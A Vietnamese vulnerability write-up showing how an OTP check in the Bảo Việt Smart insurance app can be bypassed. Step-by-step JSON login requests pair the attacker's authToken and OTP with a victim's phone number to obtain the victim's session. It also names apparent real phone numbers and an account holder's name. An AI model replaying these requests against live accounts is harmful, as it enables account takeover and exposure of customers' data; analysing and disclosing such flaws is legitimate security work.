# Phân tích bug bypass otp của app Bảo Việt Smart

- Số điện thoại attacker: `0379992123`, mã pin của attacker `123456`
- Số điện thoại victime: `0928751597`

1. Quá trình login diễn ra bình thường của app Bảo Việt Smart
- Bước 1:
  - Client gửi request

  ```JSON
  {"pin":"123456","pinType":"PASSWORD","appVersion":"1.0.1","clientId":"8466","lang":"VN","mid":1,"sessionId":"","user":"0928751597","DT":"ANDROID","E":"###865f0fd9130c0e06###00000000-55af-540e-0000-0000130e5dd8","PM":"SM-G975N","OV":"25","PS":"NOT_SAFE","ATS":"20:09:11:11:40:27"}
  ```
  - Server trả về response
  ```JSON
  {"mid":1,"loginType":"3","name":"Le Bat Pham","authToken":"xxxxxxxxxxxx","authCountdown":"180","code":"00","des":"Thành công"}
  ```
- Bước 2: Server sẽ gửi OTP về số điện thoại `0928751597` tương ứng với authToken `xxxxxxxxxxxx` ở trên
- Bước 3: Client gửi request 
  ```JSON
  {"authToken":"xxxxxxxxxxxx","authValue":"yyyyyyyy","appVersion":"1.0.1","clientId":"8466","lang":"VN","mid":2,"sessionId":"","user":"0928751597","DT":"ANDROID","E":"###865f0fd9130c0e06###00000000-55af-540e-0000-0000130e5dd8","PM":"SM-G975N","OV":"25","PS":"NOT_SAFE","ATS":"20:09:11:11:40:27"}
  ```
- Bước 4: Server trả về response
  ```JSON
  {"mid":2,"clientId":"8471","name":"Le Bat Pham","sessionId":"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz","commonKey":"tttttttttttttttttttttttttttttttttttttttttttttt","accessKey":"eyJ0aW1lc3RhbXAiOiIxNTk5ODI1MzE0MjA1IiwidG9rZW4iOiJlYzdkNDVjOC1mMjgxLTRiM2YtYWVjZC0zZWIxOTk0N2FhMGQiLCJzaWduIjoiMXBxc2FVSGNSSkZPaWZLc0k1UGxJd2tKeFdOeGkrZmoxaHRTRDBjeEFQMD0ifQ==","packageCode":"1","sessionExpire":"10","code":"00","des":"Thành công"}
  ```
- Bước 5: Client sử dụng `sessionId` này để authenticate cho các api khác.

> Vậy lỗi nằm ở đâu?

Lỗi nằm ở chỗ khi server kiểm tra OTP tương ứng với `authToken`, server không kiểm tra xem `authToken` đó có thực sự là của user đã request OTP hay không. Dẫn tới việc attacker có thể dùng `authToken` và OTP gửi về số điện thoại attacker để login bất cứ tài khoản nào attacker muốn, quá trình tấn công như sau:

- Bước 1:
  - Attacker gửi request

  ```JSON
  {"pin":"123456","pinType":"PASSWORD","appVersion":"1.0.1","clientId":"8466","lang":"VN","mid":1,"sessionId":"","user":"0379992123","DT":"ANDROID","E":"###865f0fd9130c0e06###00000000-55af-540e-0000-0000130e5dd8","PM":"SM-G975N","OV":"25","PS":"NOT_SAFE","ATS":"20:09:11:11:40:27"}
  ```
  - Server trả về response
  ```JSON
  {"mid":1,"loginType":"3","name":"VO VAN MINH","authToken":"iiiiiiiiiiii","authCountdown":"180","code":"00","des":"Thành công"}
  ```
- Bước 2: Server gửi OTP về số điện thoại của attacker `0379992123` tương ứng với authToken `iiiiiiiiiiii`
- Bước 3: Attacker gửi request
  ```JSON
  {"authToken":"iiiiiiiiiiii","authValue":"jjjjjjjj","appVersion":"1.0.1","clientId":"8466","lang":"VN","mid":2,"sessionId":"","user":"0928751597","DT":"ANDROID","E":"###865f0fd9130c0e06###00000000-55af-540e-0000-0000130e5dd8","PM":"SM-G975N","OV":"25","PS":"NOT_SAFE","ATS":"20:09:11:11:40:27"}
  ```
  trong đó `jjjjjjjj` chính là OTP mà attacker đã nhận được về số điện thoại của mình.
- Bước 4: Server trả về response
  ```JSON
  {"mid":2,"clientId":"8471","name":"Le Bat Pham","sessionId":"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz","commonKey":"tttttttttttttttttttttttttttttttttttttttttttttt","accessKey":"eyJ0aW1lc3RhbXAiOiIxNTk5ODI1MzE0MjA1IiwidG9rZW4iOiJlYzdkNDVjOC1mMjgxLTRiM2YtYWVjZC0zZWIxOTk0N2FhMGQiLCJzaWduIjoiMXBxc2FVSGNSSkZPaWZLc0k1UGxJd2tKeFdOeGkrZmoxaHRTRDBjeEFQMD0ifQ==","packageCode":"1","sessionExpire":"10","code":"00","des":"Thành công"}
  ```
  đến đây attacker đã login thành công vào tài khoản `0928751597`
- Bước 5: Attacker sử dụng `sessionId` ở trên làm gì tùy thích 😂😂😂